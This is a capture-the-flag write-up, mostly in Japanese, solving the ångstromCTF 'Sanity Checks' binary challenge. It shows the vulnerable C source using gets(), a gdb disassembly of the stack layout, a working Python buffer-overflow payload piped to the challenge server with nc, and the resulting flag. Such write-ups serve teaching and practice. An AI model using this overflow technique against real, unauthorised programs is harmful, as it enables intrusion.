# Sanity Checks:Binary:80pts
I made a [program](checks) ([source](checks.c)) to protect my flag. On the off chance someone does get in, I added some sanity checks to detect if something fishy is going on. See if you can hack me at `/problems/2021/sanity_checks` on the shell server, or connect with `nc shell.actf.co 21303`.  
Hint  
`gdb` may be helpful for analyzing how data is laid out in memory.  

# Solution
配布されたソースは以下のようであった。  
```C
~~~
    char password[64];
    int ways_to_leave_your_lover = 0;
    int what_i_cant_drive = 0;
    int when_im_walking_out_on_center_circle = 0;
    int which_highway_to_take_my_telephones_to = 0;
    int when_i_learned_the_truth = 0;
    
    printf("Enter the secret word: ");
    
    gets(&password);
    
    if(strcmp(password, "password123") == 0){
        puts("Logged in! Let's just do some quick checks to make sure everything's in order...");
        if (ways_to_leave_your_lover == 50) {
            if (what_i_cant_drive == 55) {
                if (when_im_walking_out_on_center_circle == 245) {
                    if (which_highway_to_take_my_telephones_to == 61) {
                        if (when_i_learned_the_truth == 17) {
~~~
                            
                            printf(flag);
~~~
```
BOFで変数を書き換える問題のようだ。  
まずはintについて4バイトずつ並んでいる順番を調査する。  
```bash
$ gdb ./checks
~~~
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0000000000401196 <+0>:     push   rbp
   0x0000000000401197 <+1>:     mov    rbp,rsp
   0x000000000040119a <+4>:     sub    rsp,0xe0
   0x00000000004011a1 <+11>:    mov    rax,QWORD PTR [rip+0x2ed8]        # 0x404080 <stdout@GLIBC_2.2.5>
   0x00000000004011a8 <+18>:    mov    esi,0x0
   0x00000000004011ad <+23>:    mov    rdi,rax
   0x00000000004011b0 <+26>:    call   0x401040 <setbuf@plt>
   0x00000000004011b5 <+31>:    mov    rax,QWORD PTR [rip+0x2ee4]        # 0x4040a0 <stderr@GLIBC_2.2.5>
   0x00000000004011bc <+38>:    mov    esi,0x0
   0x00000000004011c1 <+43>:    mov    rdi,rax
   0x00000000004011c4 <+46>:    call   0x401040 <setbuf@plt>
   0x00000000004011c9 <+51>:    mov    DWORD PTR [rbp-0x4],0x0
   0x00000000004011d0 <+58>:    mov    DWORD PTR [rbp-0x8],0x0
   0x00000000004011d7 <+65>:    mov    DWORD PTR [rbp-0xc],0x0
   0x00000000004011de <+72>:    mov    DWORD PTR [rbp-0x10],0x0
   0x00000000004011e5 <+79>:    mov    DWORD PTR [rbp-0x14],0x0
   0x00000000004011ec <+86>:    lea    rdi,[rip+0xe15]        # 0x402008
   0x00000000004011f3 <+93>:    mov    eax,0x0
   0x00000000004011f8 <+98>:    call   0x401050 <printf@plt>
   0x00000000004011fd <+103>:   lea    rax,[rbp-0x60]
   0x0000000000401201 <+107>:   mov    rdi,rax
   0x0000000000401204 <+110>:   mov    eax,0x0
   0x0000000000401209 <+115>:   call   0x401080 <gets@plt>
   0x000000000040120e <+120>:   lea    rax,[rbp-0x60]
   0x0000000000401212 <+124>:   lea    rsi,[rip+0xe07]        # 0x402020
   0x0000000000401219 <+131>:   mov    rdi,rax
   0x000000000040121c <+134>:   call   0x401070 <strcmp@plt>
   0x0000000000401221 <+139>:   test   eax,eax
   0x0000000000401223 <+141>:   jne    0x4012cf <main+313>
   0x0000000000401229 <+147>:   lea    rdi,[rip+0xe00]        # 0x402030
   0x0000000000401230 <+154>:   call   0x401030 <puts@plt>
   0x0000000000401235 <+159>:   cmp    DWORD PTR [rbp-0x4],0x32
   0x0000000000401239 <+163>:   jne    0x4012c1 <main+299>
   0x000000000040123f <+169>:   cmp    DWORD PTR [rbp-0x8],0x37
   0x0000000000401243 <+173>:   jne    0x4012c1 <main+299>
   0x0000000000401245 <+175>:   cmp    DWORD PTR [rbp-0xc],0xf5
   0x000000000040124c <+182>:   jne    0x4012c1 <main+299>
   0x000000000040124e <+184>:   cmp    DWORD PTR [rbp-0x10],0x3d
   0x0000000000401252 <+188>:   jne    0x4012c1 <main+299>
   0x0000000000401254 <+190>:   cmp    DWORD PTR [rbp-0x14],0x11
   0x0000000000401258 <+194>:   jne    0x4012c1 <main+299>
~~~
```
後ろから順のようだ。  
また、password[64]はrbp-0x60にあることもわかる。  
つまり、password123\0 + 64バイト + int + int + int + int + intとすればよい。  
以下のようにBOFで変数を書き換える。  
```bash
$ python3 -c "import sys; sys.stdout.buffer.write(b'password123\00'+b'A'*64+b'\x11\x00\x00\x00\x3d\x00\x00\x00\xf5\x00\x00\x00\x37\x00\x00\x00\x32\x00\x00\x00'+b'\n')" | nc shell.actf.co 21303
Enter the secret word: Logged in! Let's just do some quick checks to make sure everything's in order...
actf{if_you_aint_bout_flags_then_i_dont_mess_with_yall}
```
flagが得られた。  

## actf{if_you_aint_bout_flags_then_i_dont_mess_with_yall}